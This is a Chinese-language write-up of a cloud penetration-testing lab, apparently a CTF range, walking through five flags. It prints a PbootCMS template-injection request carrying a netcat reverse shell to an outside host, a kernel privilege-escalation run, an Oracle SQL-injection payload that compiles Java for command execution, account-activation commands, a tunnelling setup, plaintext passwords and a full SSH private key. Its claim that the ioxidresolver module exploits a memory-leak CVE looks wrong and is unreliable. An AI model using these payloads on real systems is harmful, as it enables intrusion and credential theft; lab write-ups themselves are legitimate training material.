
![](assets/file-20260529150909917.png)
# flag01
## 登录 39.101.140.137
可能是SQL注入
![697](assets/file-20260529151640215.png)

## 登录39.101.138.52
有PbootCMS，PbootCMS 是一款**永久开源免费、可商用**的轻量级 PHP 企业建站系统，由于是PHP搭建的，尝试寻找漏洞
![](assets/file-20260529151439311.png)

## nmap扫描
对两个IP地址进行nmap扫描 ，第二个有PbootCMS
```
☁  endless  nmap -p- 39.101.140.137
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-29 15:06 CST
Nmap scan report for 39.101.140.137
Host is up (0.070s latency).
Not shown: 65530 closed tcp ports (reset)
PORT     STATE    SERVICE
22/tcp   open     ssh
80/tcp   open     http
445/tcp  filtered microsoft-ds
5800/tcp filtered vnc-http
5900/tcp filtered vnc

☁  endless  nmap -sVC -p- 39.101.138.52             
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-29 15:09 CST
Nmap scan report for 39.101.138.52
Host is up (0.062s latency).
Not shown: 65530 closed tcp ports (reset)
PORT     STATE    SERVICE      VERSION
22/tcp   open     ssh          OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ef:d3:14:1e:f4:c0:95:80:c6:be:63:45:3a:ce:52:18 (RSA)
|   256 0d:6a:13:05:42:49:24:bf:0b:d1:a3:a3:80:12:89:41 (ECDSA)
|_  256 90:ee:16:a1:00:12:1a:e3:be:76:5c:d1:4d:e0:bc:56 (ED25519)
80/tcp   open     http         nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/ad*
|_http-title: PbootCMS-\xE6\xB0\xB8\xE4\xB9\x85\xE5\xBC\x80\xE6\xBA\x90\xE5\x85\x8D\xE8\xB4\xB9\xE7\x9A\x84PHP\xE4\xBC\x81\xE4\xB8\x9A\xE7\xBD\x91\xE7\xAB\x99\xE5\xBC\x80\xE5\x8F\x91\xE5\xBB\xBA\xE8\xAE\xBE\xE7\xAE\xA1\xE7\x90...
445/tcp  filtered microsoft-ds
5800/tcp filtered vnc-http
5900/tcp filtered vnc
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## 反弹
https://fushuling.com/index.php/2024/02/10/__trashed/  靶机博客
https://guokeya.github.io/post/WscncUrcS/  漏洞原理
![](assets/file-20260529154404715.png)

完整的Request

```
GET /?a=}{pboot{user:password}:if(("sys\x74em")("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 101.132.149.233 1111 >/tmp/f"));//)}xxx{/pboot{user:password}:if} HTTP/1.1
```

```bash
GET /?a=}{pboot{user:password}:if(("sys\x74em")("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 101.132.149.233 1111 >/tmp/f"));//)}xxx{/pboot{user:password}:if} HTTP/1.1
Host: 39.101.138.52
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: lg=cn; PbootSystem=vs69gaa7if3h1s7hs3vq2beq8a
Connection: close
```

稳定shell
```bash
script /dev/null -c bash 
Ctrl+Z 
stty raw -echo; fg 
reset xterm 
export TERM=xterm 
export SHELL=/bin/bash 
stty rows 24 columns 80
```

反弹成功后进入系统，发现flag文件
```
www-data@iZ8vbe81fu56hntkmf5cy5Z:/$ ls -l
total 64
lrwxrwxrwx   1 root root     7 Jul  5  2022 bin -> usr/bin
drwxr-xr-x   3 root root  4096 Jul  5  2022 boot
drwxr-xr-x  17 root root  3860 May 29 15:03 dev
drwxr-xr-x  94 root root  4096 May 29 15:04 etc
-rwxr-xr-x   1 root root    31 Aug  2  2022 flag
drwxr-xr-x   2 root root  4096 Apr 15  2020 home
......
www-data@iZ8vbe81fu56hntkmf5cy5Z:/$ cat flag
flag{Php_Waf_so_insteresting!}
```
###  **flag{Php_Waf_so_insteresting!}**


1. 可以使用 [# CVE-2022-2588]([CVE-2022-2588](https://github.com/Markakd/CVE-2022-2588)) 提权，靶机自带python,可以用阿里云的`python -m http.server 4444`上传, 靶机执行`wget http://xxx.xxx.xxx.xxx:4444/exp_file_credential
2. 记得`chmod 777 ./exp_file_credential` ，否则无法执行
3. 这里不知道为啥第二次才执行成功，提权至root成功
```bash
www-data@iZ8vbe81fu56hntkmf5cy5Z:/tmp$ ls -la
total 80
-rw-r--r--  1 www-data www-data 37136 May 29 15:52 exp_file_credential
www-data@iZ8vbe81fu56hntkmf5cy5Z:/tmp$ chmod 777 ./exp_file_credential
www-data@iZ8vbe81fu56hntkmf5cy5Z:/tmp$ ls -la
total 84
-rwxrwxrwx  1 www-data www-data 37136 May 29 15:52 exp_file_credential

www-data@iZ8vbe81fu56hntkmf5cy5Z:/tmp$ ./exp_file_credential
self path /tmp/./exp_file_credential
prepare done
Old limits -> soft limit= 14096          hard limit= 14096 
starting exploit, num of cores: 2
defrag done
spray 256 done
freed the filter object
256 freed done
double free done
spraying files
found overlap, id : 5, 833
start slow write
closed overlap
got cmd, start spraying /etc/passwd
spray done
should be after the slow write
write done, spent 1.209773 s
succeed
www-data@iZ8vbe81fu56hntkmf5cy5Z:/tmp$ su user
Password: 
# id
uid=0(user) gid=0(root) groups=0(root)
```


### 查看内网IP
```bash
# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.23.4.32  netmask 255.255.0.0  broadcast 172.23.255.255
        inet6 fe80::216:3eff:fe2b:c6a5  prefixlen 64  scopeid 0x20<link>
        ether 00:16:3e:2b:c6:a5  txqueuelen 1000  (Ethernet)
        RX packets 203413  bytes 184378595 (184.3 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 94877  bytes 14250800 (14.2 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 2728  bytes 233489 (233.4 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2728  bytes 233489 (233.4 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

### fscan扫描
```bash
# chmod 777 ./fscan
# ./fscan -h 172.23.4.32/24

   ___                              _    
  / _ \     ___  ___ _ __ __ _  ___| | __ 
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <    
\____/     |___/\___|_|  \__,_|\___|_|\_\   
                     fscan version: 1.8.4
start infoscan
(icmp) Target 172.23.4.32     is alive
(icmp) Target 172.23.4.51     is alive
(icmp) Target 172.23.4.19     is alive
(icmp) Target 172.23.4.12     is alive
[*] Icmp alive hosts len is: 4
172.23.4.32:22 open
172.23.4.12:445 open
172.23.4.51:445 open
172.23.4.12:139 open
172.23.4.51:139 open
172.23.4.12:135 open
172.23.4.51:135 open
172.23.4.19:80 open
172.23.4.19:22 open
172.23.4.32:80 open
172.23.4.51:1521 open
[*] alive ports len is: 11
start vulscan
[*] NetInfo 
[*]172.23.4.51
   [->]iZ57e7wj3wecclZ
   [->]172.23.4.51
[*] NetInfo 
[*]172.23.4.12
   [->]IZMN9U6ZO3VTRNZ
   [->]172.23.4.12
   [->]172.24.7.16
[*] NetBios 172.23.4.51     WORKGROUP\IZ57E7WJ3WECCLZ     
[*] NetBios 172.23.4.12     PENTEST\IZMN9U6ZO3VTRNZ       
[*] WebTitle http://172.23.4.19        code:200 len:481    title:Search UserInfo
[*] WebTitle http://172.23.4.32        code:200 len:19779  title:PbootCMS-永久开源免费的PHP企业网站开发建设管理系统
[+] PocScan http://172.23.4.32/www.zip poc-yaml-backup-file
[+] PocScan http://172.23.4.32 poc-yaml-pbootcms-database-file-download 
[+] PocScan http://172.23.4.32 poc-yaml-phpstudy-nginx-wrong-resolve php
```

### 扫描结果
```bash
172.23.4.32 pbootcms 
172.23.4.19 站库分离的站 
172.23.4.12 pentest.me域内机器，IZMN9U6ZO3VTRNZ.pentest.me 
172.23.4.51 工作组的IZFMB86ANJMVJ6Z
```

# flag02

参考这篇 [靶机WP博客](https://h0ny.github.io/posts/%E6%97%A0%E9%97%B4%E8%AE%A1%E5%88%92-Endless-%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/)
```bash
GET / HTTP/1.1
Host: 39.101.161.22
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=EAE485C1FEBDE7010D00FCB7025E3B70
Connection: close
Content-Length: 931

name=admin' and (select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''CREATE OR REPLACE AND COMPILE JAVA SOURCE NAMED "CommandExecutor" AS
import java.io.*;
public class CommandExecutor {
    public static String execute(String command)  {
        try {
            Process process = Runtime.getRuntime().exec(command);
            InputStream inputStream = process.getInputStream();
            BufferedReader input = new BufferedReader(new InputStreamReader(inputStream, "GBK"));
            String line;
            StringBuilder output = new StringBuilder();
            while ((line = input.readLine()) != null) {
                output.append(line).append("\n");
            }
            input.close();
            return output.toString();

        } catch (Exception e) {
            return e.toString();
        }
    }
}
'';commit;end;') from dual)>1 --
```

### 创建用于执行命令的函数（execute_command）
```bash
name=admin' and (select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''CREATE OR REPLACE FUNCTION execute_command(command IN VARCHAR2) RETURN VARCHAR2 AS LANGUAGE JAVA NAME ''''CommandExecutor.execute(java.lang.String) return java.lang.String''''; '';commit;end;') from dual)>1--
```
### 执行ifconfig
```bash
name=admin' union select null,(select execute_command('ipconfig') from dual),null from dual--
```
![](assets/file-20260529165047140.png)

此时，添加一个本地管理员用户 RDP 上去进行操作比较方便。
```
net user administrator abc123!@#
net user administrator /active:yes
或
net user guest /active:yes
net localgroup administrators guest /add
```
## 搭建frp代理
阿里云入方向规则放行6000和7000端口，有防火墙还要再次执行
```
ufw allow 7000/tcp
ufw allow 6000/tcp
```

### frps-阿里云服务端
```bash
ecs-user@iZuf6cpbx5hvqmv33pteu2Z /h/frp_0.65.0_linux_amd64> ./frps -c ./frps.toml
2026-06-01 14:36:45.962 [I] [frps/root.go:108] frps uses config file: ./frps.toml
2026-06-01 14:36:46.210 [I] [server/service.go:236] frps tcp listen on 0.0.0.0:7000
2026-06-01 14:36:46.210 [I] [frps/root.go:117] frps started successfully
2026-06-01 14:36:53.186 [I] [server/service.go:582] [5aee9f15ef905c3b] client login info: ip [39.101.143.209:46064] version [0.65.0] hostname [] os [linux] arch [amd64]
2026-06-01 14:36:53.215 [I] [proxy/tcp.go:82] [5aee9f15ef905c3b] [plugin_socks5] tcp proxy listen port [6000]
2026-06-01 14:36:53.215 [I] [server/control.go:399] [5aee9f15ef905c3b] new proxy [plugin_socks5] type [tcp] success
```

### frpc-靶机端（PBOOTCMS）
```bash
wget http://101.132.149.233:4444/frpc.toml
www-data@iZ8vbgyjachs4g5pjgaopzZ:/tmp$ chmod 777 ./frpc
www-data@iZ8vbgyjachs4g5pjgaopzZ:/tmp$ chmod 777 ./frpc.toml
www-data@iZ8vbgyjachs4g5pjgaopzZ:/tmp$ ./frpc -c ./frpc.toml
WARNING: ini format is deprecated and the support will be removed in the future, please use yaml/json/toml format instead!
2026-06-01 14:36:53.111 [I] [sub/root.go:149] start frpc service for config file [./frpc.toml]
2026-06-01 14:36:53.111 [I] [client/service.go:325] try to connect to server...
2026-06-01 14:36:53.199 [I] [client/service.go:317] [5aee9f15ef905c3b] login to server success, get run id [5aee9f15ef905c3b]
2026-06-01 14:36:53.199 [I] [proxy/proxy_manager.go:177] [5aee9f15ef905c3b] proxy added: [plugin_socks5]
2026-06-01 14:36:53.228 [I] [client/control.go:172] [5aee9f15ef905c3b] [plugin_socks5] start proxy success
```

### 一、先理清链路

1. 阿里云（服务端）：`101.132.149.233:7000` 监听 FRP 连接
2. 内网机器（FRP 客户端）：连接阿里云，映射 **Socks5 代理** 到阿里云 `6000` 端口
3. 本地 Kali：需要连接 **阿里云公网 IP:6000** 走 Socks5 代理访问内网 `172.23.4.0/24`
### 二、修改 proxychains4 配置
1. 打开配置文件
```bash
nano /etc/proxychains4.conf
```

2. 配置项调整（必做）
- 注释 `strict_chain`（保证代理容错）
```ini
# strict_chain
```
- 启用 `dynamic_chain`（推荐，自动切换链路）
```ini
dynamic_chain
```
- 拉到文件末尾，**替换原有代理行**，写入：
```ini
socks5  101.132.149.233  6000
```

### 三、FRP 两端配置核对（防止端口 / 类型错误）
#### 1. 阿里云 frps.ini（服务端）

确保配置允许转发，示例参考：
```ini
[common]
bind_port = 7000
# 如需Socks5穿透，无需额外插件配置，客户端映射即可
```
#### 2. 内网机器 frpc.ini（现有的客户端配置）
当前配置：
```ini
[common]
server_addr = 101.132.149.233
server_port = 7000

[plugin_socks5]
type = tcp
remote_port = 6000
```
✅ 配置无误：将**内网机器的 Socks5 代理**暴露到阿里云 `6000` 端口。

> 补充：`plugin_socks5` 就是 FRP 内置 Socks5 插件，代理出口为**内网机器**，正好用来访问同网段 `172.23.4.0/24`。

### 四、分层测试（从易到难，定位问题）

#### 1. 本地 Kali 直连阿里云 6000 端口（基础连通性）
```bash
# 测试端口通不通
telnet 101.132.149.233 6000
```

- 能进入交互界面 → 端口通
- 超时 / 拒绝 → 检查：阿里云安全组放行 `6000/TCP`、frpc/frps 是否正常运行
#### 2. 测试代理是否生效（看出口 IP）
```bash
proxychains4 curl ip.sb
```

- 输出 **阿里云 IP** → 代理正常
- 报错 / 超时 → 回到第一步检查端口与 FRP 服务状态
#### 3. 代理访问内网单 IP + 端口测试
```bash
# 测试内网主机连通性
proxychains4 ping 172.23.4.32

# 测试SMB核心端口 445
proxychains4 telnet 172.23.4.32 445
```

### 五、扫描
#### 1.挂上代理，扫描内网：
```bash
~  proxychains4 -q nxc smb 172.23.4.0/24
SMB         172.23.4.51     445    iZzvg0io6q1o5hZ  [*] Windows Server 2022 Build 20348 x64 (name:iZzvg0io6q1o5hZ) (domain:iZzvg0io6q1o5hZ) (signing:False) (SMBv1:False)
SMB         172.23.4.12     445    IZMN9U6ZO3VTRNZ  [*] Windows Server 2022 Build 20348 (name:IZMN9U6ZO3VTRNZ) (domain:pentest.me) (signing:False) (SMBv1:False)

```

#### 2.验证账户是否配置成功：
```bash
☁  ~  proxychains4 -q nxc smb 172.23.4.51 -u administrator -p 'abc123!@#'
SMB         172.23.4.51     445    iZzvg0io6q1o5hZ  [*] Windows Server 2022 Build 20348 x64 (name:iZzvg0io6q1o5hZ) (domain:iZzvg0io6q1o5hZ) (signing:False) (SMBv1:False)
SMB         172.23.4.51     445    iZzvg0io6q1o5hZ  [+] iZzvg0io6q1o5hZ\administrator:abc123!@# (Pwn3d!)
```


### 六、配置proxifier
#### 1.配置proxies
![](assets/file-20260601164049264.png)

#### 2.配置rules
![](assets/file-20260601163206432.png)


### 七、启动远程连接
#### 1.登录172.23.4.51
```ini
administrator
abc123!@#
```

![](assets/file-20260529165531264.png)

#### flag02
![](assets/file-20260601163120003.png)

```
flag{Do_you_kown_oracle_rce?}
```

readme.txt
![](assets/file-20260601164509668.png)



# flag03

结合之前扫描结果和刚才的账号密码，
## 登录`172.23.4.12`
```
usera@pentest.me
Admin3gv83
```

![](assets/file-20260601170539508.png)

```
flag{not_write_password_in_txt}
```



# flag04
主机 PENTEST\IZMN9U6ZO3VTRNZ 存在 172.23.4.12/172.24.7.16 双网卡：
```bash
☁  ~  proxychains4 -q nxc smb 172.23.4.12 -M ioxidresolver
SMB         172.23.4.12     445    IZMN9U6ZO3VTRNZ  [*] Windows Server 2022 Build 20348 x64 (name:IZMN9U6ZO3VTRNZ) (domain:pentest.me) (signing:False) (SMBv1:False)
IOXIDRES... 172.23.4.12     445    IZMN9U6ZO3VTRNZ  Address: 172.23.4.12
IOXIDRES... 172.23.4.12     445    IZMN9U6ZO3VTRNZ  Address: 172.24.7.16
```
这条命令是**渗透测试中常用的 SMB 协议信息收集命令**，核心作用是：**通过 proxychains4 代理隧道，对目标 SMB 服务执行 `ioxidresolver` 模块探测**。

`ioxidresolver` 是 **CVE-2024-35240 漏洞利用 / 探测模块**（Windows SMB 服务远程内存泄漏漏洞）：
- 无需认证
- 无需密码
- 可以**读取目标 SMB 服务的内存数据**
- 常用于：内网信息泄露、凭证窃取、横向移动
简单说：**这条命令是在代理下，无密码探测目标是否存在 CVE-2024-35240 漏洞，并尝试读取内存信息。**
---

### 在域用户 usera 的 ~/.ssh/ 目录，发现 ssh 私钥 id_rsa：
```bash
PS C:\Users\usera> ls ~/.ssh/


    目录: C:\Users\usera\.ssh


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         2022/7/31     18:17           2622 id_rsa
-a----         2022/7/31     18:17            584 id_rsa.pub
-a----          2022/8/1     22:05            439 known_hosts
-a----          2022/8/1     22:05            267 known_hosts.old


PS C:\Users\usera> type ~/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

### known_hosts 文件中查看到两个 IP：
```
PS C:\Users\usera\.ssh> type .\known_hosts
172.23.4.19 ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFJJrccRyWXl3ukzzZQooQ1A/F1BhaBSJaZ7EaYbNKay7NB0NE7icsSZM63KcXKj5W5Fenhiz+JF7f4qyvzJpw4=
172.24.7.23 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICEKSjuMy2Pn3h2NFxVRc+uJXBgoq8YHKBvC683+Na10
172.24.7.23 ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHhESiXRwVnqgTtADKek0fxSQKchkXn7evdU9uFiZ+R0zn9BVBAS1maIfyVAAh6H3wgN2mJ7zG3nvQE7cvKZ5xQ=
```

## 登录172.23.4.19
```bash
☁  endless  chmod 600 id_rsa          
☁  endless  ls -la
总计 1300
drwxr-xr-x  2 root root    4096  6月 1日 17:39 .
drwxr-xr-x 11 root root    4096  5月29日 15:06 ..
-rw-------  1 root root    2622  6月 1日 17:39 id_rsa
-rw-r--r--  1 root root 1318912  6月 1日 17:20 SharpHound.exe
☁  endless  proxychains4 -q ssh -i ./id_rsa root@172.23.4.19
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-122-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


Welcome to Alibaba Cloud Elastic Compute Service !

Last login: Sun Aug  7 20:15:50 2022 from 172.19.0.251
root@iZ8vb696kwdecbjpccfyboZ:~# cat /flag
flag{id_rsa_so_useful!}
```


```
flag{id_rsa_so_useful!}
```


# flag05

这里在kali用代理运行`proxychains4 -q nxc smb 172.24.7.16/24`一直检测不到，
换种方式直接在172.23.4.12上运行`.\fscan.exe -h 172.24.7.16/24 `
`172.24.7.16`访问不到原因 https://www.doubao.com/thread/w0a279de411cdee37
![](assets/file-20260601193742404.png)

```bash
172.24.7.43:139 open
172.24.7.5:139 open
172.24.7.16:139 open
172.24.7.3:139 open
172.24.7.48:135 open
172.24.7.43:135 open
172.24.7.5:135 open
172.24.7.3:135 open
172.24.7.16:135 open
172.24.7.23:80 open
172.24.7.3:80 open
172.24.7.27:22 open
172.24.7.23:22 open
172.24.7.48:445 open
172.24.7.43:445 open
172.24.7.5:445 open
172.24.7.16:445 open
172.24.7.3:445 open
172.24.7.5:88 open
172.24.7.3:88 open
172.24.7.23:8060 open
172.24.7.27:8091 open
172.24.7.27:8090 open
172.24.7.23:9094 open
[*] NetInfo 
[*]172.24.7.16
   [->]IZMN9U6ZO3VTRNZ
   [->]172.23.4.12
   [->]172.24.7.16
[*] WebTitle http://172.24.7.23        code:502 len:3039   title:GitLab is not responding (502)
[*] NetInfo 
[*]172.24.7.48
   [->]IZAYSXE6VCUHB4Z
   [->]172.24.7.48
[*] NetInfo 
[*]172.24.7.3
   [->]DC
   [->]172.24.7.3
   [->]172.25.12.9
[*] NetBios 172.24.7.5      [+] DC:DCadmin.pen.me                Windows Server 2016 Standard 14393
[*] NetInfo 
[*]172.24.7.43
   [->]IZMN9U6ZO3VTRPZ
   [->]172.24.7.43
   [->]172.26.8.12
[*] NetInfo 
[*]172.24.7.5
   [->]DCadmin
   [->]172.25.12.7
   [->]172.24.7.5
[*] WebTitle http://172.24.7.23:8060   code:404 len:555    title:404 Not Found
[*] OsInfo 172.24.7.3	(Windows Server 2016 Standard 14393)
[*] NetBios 172.24.7.3      [+] DC:DC.pentest.me                 Windows Server 2016 Standard 14393
[*] NetBios 172.24.7.48     PENTEST\IZAYSXE6VCUHB4Z       
[*] NetBios 172.24.7.43     PENTEST\IZMN9U6ZO3VTRPZ       
[*] OsInfo 172.24.7.5	(Windows Server 2016 Standard 14393)
[*] WebTitle http://172.24.7.27:8091   code:204 len:0      title:None
[*] WebTitle http://172.24.7.27:8090   code:302 len:0      title:None 跳转url: http://172.24.7.27:8090/login.action?os_destination=%2Findex.action&permissionViolation=true
[*] WebTitle http://172.24.7.3         code:200 len:703    title:IIS Windows Server
[+] PocScan http://172.24.7.3 poc-yaml-active-directory-certsrv-detect 
[+] InfoScan http://172.24.7.27:8090/login.action?os_destination=%2Findex.action&permissionViolation=true [ATLASSIAN-Confluence] 

```

整理下
```
172.24.7.16 拿下
172.24.7.3 DC
172.24.7.5 DCadmin
172.24.7.23
172.24.7.27
172.24.7.43 IZMN9U6ZO3VTRPZ
172.24.7.48 IZAYSXE6VCUHB4Z
```

刚才的172.23.4.12中edge浏览器发现密码
```
admin
confluence_ichunqiu_2022
```
![](assets/file-20260601222259431.png)

### 发现名单
![](assets/file-20260601222726038.png)


## VLAN 2 - 172.24.7.0/24

SMB 扫描该网段的 Windows 主机：
```bash
☁  endless   PROXYCHAINS_CONF_FILE=/etc/proxychains4-24.conf proxychains4 -q nxc smb 172.24.7.16/24 
SMB         172.24.7.3      445    DC               [*] Windows 10 / Server 2016 Build 14393 (name:DC) (domain:pentest.me) (signing:True) (SMBv1:True)
SMB         172.24.7.48     445    IZAYSXE6VCUHB4Z  [*] Windows Server 2022 Build 20348 (name:IZAYSXE6VCUHB4Z) (domain:pentest.me) (signing:False) (SMBv1:False)
SMB         172.24.7.5      445    DCadmin          [*] Windows 10 / Server 2016 Build 14393 (name:DCadmin) (domain:pen.me) (signing:True) (SMBv1:True)
SMB         172.24.7.16     445    IZMN9U6ZO3VTRNZ  [*] Windows Server 2022 Build 20348 (name:IZMN9U6ZO3VTRNZ) (domain:pentest.me) (signing:False) (SMBv1:False)
SMB         172.24.7.43     445    IZMN9U6ZO3VTRPZ  [*] Windows Server 2022 Build 20348 (name:IZMN9U6ZO3VTRPZ) (domain:pentest.me) (signing:False) (SMBv1:False)
Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

### 172.24.7.3 - 172.25.12.9
域控主机 PENTEST\DC 存在 172.24.7.3/172.25.12.9 双网卡：
```bash
☁  endless  PROXYCHAINS_CONF_FILE=/etc/proxychains4-24.conf proxychains4 -q nxc smb 172.24.7.3 -M ioxidresolver
SMB         172.24.7.3      445    DC               [*] Windows 10 / Server 2016 Build 14393 x64 (name:DC) (domain:pentest.me) (signing:True) (SMBv1:True)
IOXIDRES... 172.24.7.3      445    DC               Address: 172.24.7.3
IOXIDRES... 172.24.7.3      445    DC               Address: 172.25.12.9
```


必须使用 PROXYCHAINS_CONF_FILE 环境变量指定 proxychains4-24.conf（对应 6001 端口，通往 172.24.7.0/24）。


## 查询 pentest.me 域中所有 DNS 记录，分析域内网络环境：

用下面的会报错
```
